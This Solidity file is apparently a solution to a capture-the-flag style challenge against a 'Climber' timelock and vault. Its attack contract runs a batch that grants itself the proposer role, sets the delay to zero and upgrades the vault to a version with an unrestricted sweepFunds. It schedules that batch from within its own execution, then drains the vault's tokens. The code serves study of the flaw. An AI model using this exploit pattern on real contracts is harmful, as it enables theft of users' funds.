// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";
import "./ClimberVault.sol";
import {PROPOSER_ROLE} from "./ClimberConstants.sol";

interface ITimelock {
    function execute(
        address[] memory targets,
        uint256[] memory values,
        bytes[] memory dataElements,
        bytes32 salt
    ) external;

    function schedule(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external;
}

contract testClimber {
    address token;
    address timelock;
    address climber;
    address player;
    address[] targets;
    uint256[] values;
    bytes[] dataElements;
    bytes32 salt;

    constructor(
        address _token,
        address _timelock,
        address _climber,
        address _player
    ) {
        token = _token;
        player = _player;
        timelock = _timelock;
        climber = _climber;
    }

    function start() external {
        targets = new address[](4);
        values = new uint256[](4);
        dataElements = new bytes[](4);
        //grant role
        targets[0] = timelock;
        dataElements[0] = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            PROPOSER_ROLE,
            address(this)
        );

        //updatedelay
        targets[1] = timelock;
        dataElements[1] = abi.encodeWithSignature(
            "updateDelay(uint64)",
            uint64(0)
        );

        //update vault
        address newVault = address(new ClimberVault2());
        targets[2] = climber;
        dataElements[2] = abi.encodeWithSignature(
            "upgradeTo(address)",
            newVault
        );

        //schedule
        targets[3] = address(this);
        dataElements[3] = abi.encodeWithSignature("schedule()");

        ITimelock(timelock).execute(targets, values, dataElements, salt);

        ClimberVault2(climber).sweepFunds(token, player);
    }

    function schedule() public {
        ITimelock(timelock).schedule(targets, values, dataElements, salt);
    }

    function printTokenBalance(
        address _token,
        address addr,
        string memory msg
    ) public returns (uint256) {
        (bool suc, bytes memory bal) = _token.call(
            abi.encodeWithSignature("balanceOf(address)", addr)
        );
        require(suc, msg);
        uint256 balance = abi.decode(bal, (uint256));

        console.log(msg, balance);
        return balance;
    }

    fallback() external payable {}

    receive() external payable {}
}

contract ClimberVault2 is ClimberVault {
    function sweepFunds(address token, address to) external {
        SafeTransferLib.safeTransfer(
            token,
            to,
            IERC20(token).balanceOf(address(this))
        );
    }
}
